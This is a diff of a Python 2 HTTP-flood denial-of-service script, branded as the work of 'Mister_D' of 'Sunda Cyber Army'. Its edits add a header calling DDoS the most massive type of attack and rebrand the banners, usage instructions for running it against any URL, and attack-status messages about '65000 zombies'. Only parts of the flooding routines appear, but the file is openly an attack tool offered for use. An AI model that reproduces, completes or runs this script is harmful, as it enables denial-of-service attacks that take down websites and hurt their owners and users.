@@ -1,3 +1,8 @@
+# Sunda Cyber Army 
+# Protokol DDoS adalah tipe serangan paling masif
+# Youtube Link : https://www.youtube.com/watch?v=_gc7N2TcvXg
+# Author : Mister_D
+# ------------------------------------------------------------------------------------------
 import urllib2
 import sys
 import threading
@@ -3055,18 +3060,18 @@ def buildblock(size):
 
 def usage():
 	print '---------------------------------------------------'
-	print 'AKU BERDIRI SENDIRI !'
-	print 'HILANG PERCAYA DIRI !'
-	print 'SUNDA CYBER ARMY 2k17 _/\_'
-	print 'To use windows : mister duce.py <url> '
-	print 'To use Linux   : python mister duce.py <url> '
+	print 'SUNDA CYBER ARMY !'
+	print 'SQUAD SUNDA SARENG !'
+	print 'URANG TIASA _/\_'
+	print 'To use windows : mister_d.py <url> '
+	print 'To use Linux   : python mister_d.py <url> '
 	print "\a"
 	
 print \
 """                        .
 
  /$$      /$$  /$$$$$$$	      		 /$$$$$$\
-| $$$    /$$$ | $$     $$	        | $$    $$ 
+| $$$    /$$$ | $$     $$    _ _ _ _ _  | $$    $$ 
 | $$$$  /$$$$ | $$     $$  /----------\ | $$    $$
 | $$ $$/$$ $$ | $$$$$$$$/  | MISTER-D | | $$    $$                      
 | $$  $$$| $$ | $$___  $$  \__________/ | $$    $$                  
@@ -3075,7 +3080,7 @@ print \
 |__/     |__/ |__/   |__/		|_______/
                                                            
 _____________________________ [WINDOWS AND KALI-LINUX]_______________________
-      _______________________ SUNDA CYBER ARMY MISTER_D____________________
+      _______________________ SUNDA CYBER ARMY | MISTER_D____________________
 
 TANGAN KOSONG 
 MAKAN KEDONGDONG
@@ -3107,7 +3112,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
- 			print '=> THE ATTACK OF SUNDA CYBER ARMY 65000 ZOMBIE IS SENDED<= '
+ 			print '=> THE ATTACK OF SUNDA CYBER ARMY 65000 ZOMBIE IS SENDED <= '
  			print '=> |_MISTER-D_| <= '
 			code=500
 	except urllib2.URLError, e:
